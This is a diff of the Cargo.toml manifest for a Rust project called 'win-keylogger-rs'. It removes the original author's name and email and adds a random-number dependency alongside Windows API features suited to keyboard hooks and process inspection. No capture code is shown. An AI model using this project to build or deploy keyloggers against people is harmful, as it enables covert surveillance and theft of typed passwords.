@@ -1,13 +1,14 @@
 [package]
 name = "win-keylogger-rs"
 version = "0.1.1"
-authors = ["Thomas Lienbacher <lienbacher.tom@gmail.com>"]
+authors = [""]
 edition = "2018"
 
 [dependencies]
 chrono = "0.4.6"
 os_info = "*"
 hostname = "*"
+rand="0.8.5"
 
 [target.'cfg(windows)'.dependencies]
 winapi = { version = "0.3", features = ["winuser", "winnt", "processthreadsapi", "psapi", "winnls"] }
